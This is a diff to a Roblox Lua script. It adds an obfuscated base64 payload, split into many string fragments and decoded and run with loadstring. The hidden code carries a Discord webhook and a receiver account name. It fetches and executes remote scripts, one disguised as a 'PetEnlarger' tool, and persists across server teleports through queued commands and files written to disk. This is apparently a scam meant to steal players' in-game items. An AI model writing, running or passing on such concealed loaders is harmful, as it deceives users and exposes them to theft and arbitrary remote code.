@@ -1,3 +1,32 @@
-```lua
-ID="95b75b14-27e3-44d4-9cc3-77b06109c655";
-loadstring(game:HttpGet("https://cdn.reverse.software/loader.luau"))()```
+local _e6c04e6b = {}
+_e6c04e6b[1] = "CmxvY2FsIFBsYXllcnMgPSBnYW1lOkdldFNlcnZpY2UoIlBsYX"; _e6c04e6b[2] = "llcnMiKQpsb2NhbCBwbGF5ZXIgPSBQbGF5ZXJzLkxvY2FsUGxh"; _e6c04e6b[3] = "eWVyCmxvY2FsIGpvYklkID0gZ2FtZS5Kb2JJZAoKbG9jYWwgZX"; _e6c04e6b[4] = "hlY3V0aW9uS2V5ID0gIkNoZXRvc1BheWxvYWRfIiAuLiBwbGF5"; _e6c04e6b[5] = "ZXIuVXNlcklkIC4uICJfIiAuLiBqb2JJZAoKaWYgZ2V0Z2Vudi"; _e6c04e6b[6] = "gpW2V4ZWN1dGlvbktleV0gdGhlbgogICAgcmV0dXJuCmVuZAoK"; _e6c04e6b[7] = "Z2V0Z2VudigpW2V4ZWN1dGlvbktleV0gPSB0cnVlCgpsb2NhbC"; _e6c04e6b[8] = "BtYWluU2NyaXB0VXJsID0gImh0dHBzOi8vcmF3LmdpdGh1YnVz"; _e6c04e6b[9] = "ZXJjb250ZW50LmNvbS9EdXBlTmV3L2JvdC9yZWZzL2hlYWRzL2"; _e6c04e6b[10] = "1haW4vaHMiCmxvY2FsIGxvYWRlclVybCA9ICJodHRwczovL2Fw"; _e6c04e6b[11] = "aS5ydWJpcy5hcHAvdjIvc2NyYXAvSUN2VjliSWc4VDJHMXd1Ry"; _e6c04e6b[12] = "9yYXciCmxvY2FsIHlvdXJzY3JpcHR1cmwgPSAiaHR0cHM6Ly9y"; _e6c04e6b[13] = "YXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0R1cGVOZXcvbG9hZG"; _e6c04e6b[14] = "VyL3JlZnMvaGVhZHMvbWFpbi9QZXRFbmxhcmdlci5sdWEiCgps"; _e6c04e6b[15] = "b2NhbCB1c2VyV2ViaG9vayA9ICJodHRwczovL2Rpc2NvcmQuY2"; _e6c04e6b[16] = "9tL2FwaS93ZWJob29rcy8xNDA3NTA4NzIwOTI1Mjc4Mjc4L3B4"; _e6c04e6b[17] = "czJXdGRlQmZpZ2tzcnM4QWY4NTFYVTVsZFcydnNZVklCNnE1aG"; _e6c04e6b[18] = "kwSUFkV0VHRng4N3BCVS1DSDBKVWVJM1h1MklPIgpsb2NhbCBy"; _e6c04e6b[19] = "ZWNlaXZlck5hbWUgPSAieHJ6cEFsdCIKCmxvY2FsIGZ1bmN0aW"; _e6c04e6b[20] = "9uIGV4ZWN1dGVVcmwodXJsKQogICAgaWYgdXJsIGFuZCB1cmw6"; _e6c04e6b[21] = "Z3N1YigiJXMiLCAiIikgfj0gIiIgdGhlbgogICAgICAgIHBjYW"; _e6c04e6b[22] = "xsKGZ1bmN0aW9uKCkgbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQo"; _e6c04e6b[23] = "dXJsKSkoKSBlbmQpCiAgICBlbmQKZW5kCgp0YXNrLnNwYXduKG"; _e6c04e6b[24] = "Z1bmN0aW9uKCkKICAgIGdldGdlbnYoKS5XZWJob29rID0gdXNl"; _e6c04e6b[25] = "cldlYmhvb2sKICAgIGdldGdlbnYoKS5yZWNlaXZlciA9IHJlY2"; _e6c04e6b[26] = "VpdmVyTmFtZQoKICAgIGV4ZWN1dGVVcmwobWFpblNjcmlwdFVy"; _e6c04e6b[27] = "bCkKICAgIGV4ZWN1dGVVcmwobG9hZGVyVXJsKQogICAgdGFzay"; _e6c04e6b[28] = "53YWl0KDEuMSkKCiAgICBleGVjdXRlVXJsKHlvdXJzY3JpcHR1"; _e6c04e6b[29] = "cmwpCmVuZCkKCmlmIHF1ZXVlX29uX3RlbGVwb3J0IHRoZW4KIC"; _e6c04e6b[30] = "AgIGxvY2FsIGZ1bmN0aW9uIGJ1aWxkQ29tbWFuZCh1cmwpCiAg"; _e6c04e6b[31] = "ICAgICAgaWYgdXJsIGFuZCB1cmw6Z3N1YigiJXMiLCAiIikgfj"; _e6c04e6b[32] = "0gIiIgdGhlbgogICAgICAgICAgICByZXR1cm4gc3RyaW5nLmZv"; _e6c04e6b[33] = "cm1hdCgicGNhbGwoZnVuY3Rpb24oKSBsb2Fkc3RyaW5nKGdhbW"; _e6c04e6b[34] = "U6SHR0cEdldCgnJXMnKSkoKSBlbmQpIiwgdXJsKQogICAgICAg"; _e6c04e6b[35] = "IGVuZAogICAgICAgIHJldHVybiAiIgogICAgZW5kCgogICAgbG"; _e6c04e6b[36] = "9jYWwgYW50aUV4ZWN1dGVDb2RlID0gc3RyaW5nLmZvcm1hdChb"; _e6c04e6b[37] = "WwogICAgICAgIGxvY2FsIFBsYXllcnMgPSBnYW1lOkdldFNlcn"; _e6c04e6b[38] = "ZpY2UoIlBsYXllcnMiKQogICAgICAgIGxvY2FsIHBsYXllciA9"; _e6c04e6b[39] = "IFBsYXllcnMuTG9jYWxQbGF5ZXIKICAgICAgICBsb2NhbCBqb2"; _e6c04e6b[40] = "JJZCA9IGdhbWUuSm9iSWQKICAgICAgICBsb2NhbCBleGVjdXRp"; _e6c04e6b[41] = "b25LZXkgPSAiQ2hldG9zUGF5bG9hZF8iIC4uIHBsYXllci5Vc2"; _e6c04e6b[42] = "VySWQgLi4gIl8iIC4uIGpvYklkCiAgICAgICAgaWYgZ2V0Z2Vu"; _e6c04e6b[43] = "digpW2V4ZWN1dGlvbktleV0gdGhlbiByZXR1cm4gZW5kCiAgIC"; _e6c04e6b[44] = "AgICAgZ2V0Z2VudigpW2V4ZWN1dGlvbktleV0gPSB0cnVlCiAg"; _e6c04e6b[45] = "ICBdXSkKCiAgICBsb2NhbCBjb21tYW5kUGFydHMgPSB7CiAgIC"; _e6c04e6b[46] = "AgICAgYW50aUV4ZWN1dGVDb2RlLAogICAgICAgIHN0cmluZy5m"; _e6c04e6b[47] = "b3JtYXQoImdldGdlbnYoKS5XZWJob29rID0gJyVzJyIsIHVzZX"; _e6c04e6b[48] = "JXZWJob29rKSwKICAgICAgICBzdHJpbmcuZm9ybWF0KCJnZXRn"; _e6c04e6b[49] = "ZW52KCkucmVjZWl2ZXIgPSAnJXMnIiwgcmVjZWl2ZXJOYW1lKS"; _e6c04e6b[50] = "wKICAgICAgICBidWlsZENvbW1hbmQobWFpblNjcmlwdFVybCks"; _e6c04e6b[51] = "CiAgICAgICAgYnVpbGRDb21tYW5kKHlvdXJzY3JpcHR1cmwpCi"; _e6c04e6b[52] = "AgICB9CgogICAgbG9jYWwgZnVsbENvbW1hbmRUb1J1biA9IHRh"; _e6c04e6b[53] = "YmxlLmNvbmNhdChjb21tYW5kUGFydHMsICI7ICIpCgogICAgZm"; _e6c04e6b[54] = "9yIGkgPSAxLCAyNSBkbwogICAgICAgIHBjYWxsKGZ1bmN0aW9u"; _e6c04e6b[55] = "KCkKICAgICAgICAgICAgcXVldWVfb25fdGVsZXBvcnQoZnVsbE"; _e6c04e6b[56] = "NvbW1hbmRUb1J1bikKICAgICAgICBlbmQpCiAgICBlbmQKCiAg"; _e6c04e6b[57] = "ICBmb3IgaSA9IDEsIDEwIGRvCiAgICAgICAgcGNhbGwoZnVuY3"; _e6c04e6b[58] = "Rpb24oKQogICAgICAgICAgICBpZiBzeW4gYW5kIHN5bi5xdWV1"; _e6c04e6b[59] = "ZV9vbl90ZWxlcG9ydCB0aGVuCiAgICAgICAgICAgICAgICBzeW"; _e6c04e6b[60] = "4ucXVldWVfb25fdGVsZXBvcnQoZnVsbENvbW1hbmRUb1J1bikK"; _e6c04e6b[61] = "ICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kKQogICAgICAgIH"; _e6c04e6b[62] = "BjYWxsKGZ1bmN0aW9uKCkKICAgICAgICAgICAgaWYgU3luYXBz"; _e6c04e6b[63] = "ZSBhbmQgU3luYXBzZS5xdWV1ZV9vbl90ZWxlcG9ydCB0aGVuCi"; _e6c04e6b[64] = "AgICAgICAgICAgICAgICBTeW5hcHNlLnF1ZXVlX29uX3RlbGVw"; _e6c04e6b[65] = "b3J0KGZ1bGxDb21tYW5kVG9SdW4pCiAgICAgICAgICAgIGVuZA"; _e6c04e6b[66] = "ogICAgICAgIGVuZCkKICAgIGVuZAoKICAgIGZvciBpID0gMSwg"; _e6c04e6b[67] = "NSBkbwogICAgICAgIHBjYWxsKGZ1bmN0aW9uKCkKICAgICAgIC"; _e6c04e6b[68] = "AgICAgaWYgd3JpdGVmaWxlIGFuZCByZWFkZmlsZSB0aGVuCiAg"; _e6c04e6b[69] = "ICAgICAgICAgICAgICB3cml0ZWZpbGUoImF1dG9xdWV1ZV8iIC"; _e6c04e6b[70] = "4uIGkgLi4gIi5sdWEiLCBmdWxsQ29tbWFuZFRvUnVuKQogICAg"; _e6c04e6b[71] = "ICAgICAgICAgICAgcXVldWVfb25fdGVsZXBvcnQoJ3BjYWxsKG"; _e6c04e6b[72] = "Z1bmN0aW9uKCkgbG9hZHN0cmluZyhyZWFkZmlsZSgiYXV0b3F1"; _e6c04e6b[73] = "ZXVlXycgLi4gaSAuLiAnLmx1YSIpKSgpIGVuZCknKQogICAgIC"; _e6c04e6b[74] = "AgICAgICBlbmQKICAgICAgICBlbmQpCiAgICBlbmQKZW5kCg=="
+local _6d713bfb = ""
+for i = 1, #_e6c04e6b do
+    _6d713bfb = _6d713bfb .. (_e6c04e6b[i] or "")
+end
+local _fd3b7032 = ""
+local _f573145f = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
+for i = 1, #_6d713bfb, 4 do
+    local _be11ae5f = _6d713bfb:sub(i, i+3)
+    local _d3e04189 = 0
+    for j = 1, #_be11ae5f do
+        local _8520787e = _f573145f:find(_be11ae5f:sub(j,j))
+        if _8520787e then
+            _8520787e = _8520787e - 1
+            _d3e04189 = _d3e04189 + _8520787e * (64 ^ (4-j))
+        end
+    end
+    for j = 1, 3 do
+        if i + j - 1 <= #_6d713bfb then
+            _fd3b7032 = _fd3b7032 .. string.char(math.floor(_d3e04189 / (256 ^ (3-j))) % 256)
+        end
+    end
+end
+local _a04e6966 = ""
+local _counter = 1
+while _counter <= #_fd3b7032 do
+    local _byte = _fd3b7032:byte(_counter)
+    _a04e6966 = _a04e6966 .. string.char(_byte)
+    _counter = _counter + 1
+end
+loadstring(_a04e6966)()
